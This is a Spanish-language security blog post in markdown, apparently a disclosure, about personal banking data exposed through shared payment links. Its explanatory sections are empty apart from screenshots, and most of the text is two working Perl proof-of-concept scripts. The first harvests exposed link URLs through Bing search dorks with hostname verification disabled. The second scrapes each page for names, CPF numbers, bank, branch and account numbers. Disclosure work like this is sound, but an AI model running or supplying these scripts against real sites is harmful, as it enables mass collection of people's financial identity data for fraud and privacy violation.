---
layout: content
title: 'Un pequeño caso de scraping de datos personales expuestos en la web'
description: ''
og_image: https://heitorgouvea.me/images/publications/nubank-scraping/google-dorks.png
---

### Resumen

---


### Descricion

![](/images/publications/nubank-scraping/creating-a-link.png)
![](/images/publications/nubank-scraping/whatsapp-shared-link.png)
![](/images/publications/nubank-scraping/personal-infos.png)
![](/images/publications/nubank-scraping/google-dorks.png)
![](/images/publications/nubank-scraping/twitter-links.png)


---

### Prueba de Concepto

```perl
#!/usr/bin/env perl

use 5.030;
use strict;
use warnings;
use WWW::Mechanize;
use Mojo::Util qw(url_escape);

sub main {
    my $dork = $ARGV[0];

    if ($dork) {
        $dork = url_escape($dork);

        my %seen  = ();
        my $mech = WWW::Mechanize -> new();

        $mech -> ssl_opts (verify_hostname => 0);

        for my $page (0 .. 10) {
            my $url = "https://wwww.bing.com/search?q=${dork}&first=${page}0";

            $mech -> get($url);

            my @links = $mech -> links();

            foreach my $link (@links) {
                $url = $link -> url();

                next if $seen{$url}++;

                if ($url =~ m/^https?/ && $url !~ m/bing|live|microsoft|msn/) {
                    print $url, "\n";
                }
            }
        }
    }
}

exit main();
```

![](/images/publications/nubank-scraping/file-with-the-urls.png)


```perl
#!/usr/bin/env perl

use 5.030;
use strict;
use warnings;
use Mojo::DOM;
use Mojo::UserAgent;

binmode(STDOUT, ":encoding(UTF-8)");

sub main {
    my $urls_file = $ARGV[0];

    if ($urls_file) {
        my $userAgent = Mojo::UserAgent -> new (
            agent => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
        );
        
        open my $urls_filehandle, "<", $urls_file or die $!;

        while (<$urls_filehandle>) {
            chomp ($_);
            
            my $request = $userAgent -> get($_) -> result();

            if ($request -> is_success()) {
                my $account = $request -> dom -> find("tr td") -> map("text") -> join(",");

                $account =~ s/Nome,//
                && $account =~ s/CPF,//
                && $account =~ s/Banco,//
                && $account =~ s/Tipo da conta,//
                && $account =~ s/Agência,//
                && $account =~ s/Conta,//
                && $account =~ s/Agência Métodos,//;

                say $account;
            }
        }

        close ($urls_filehandle);
    }
}

exit main();
```


![](/images/publications/nubank-scraping/collect-with-names-cpfs.png)

---

### Referencias

- [1] [https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)
- [2] [https://en.wikipedia.org/wiki/Google_hacking](https://en.wikipedia.org/wiki/Google_hacking)
- [3] [https://en.wikipedia.org/wiki/Web_scraping](https://en.wikipedia.org/wiki/Web_scraping)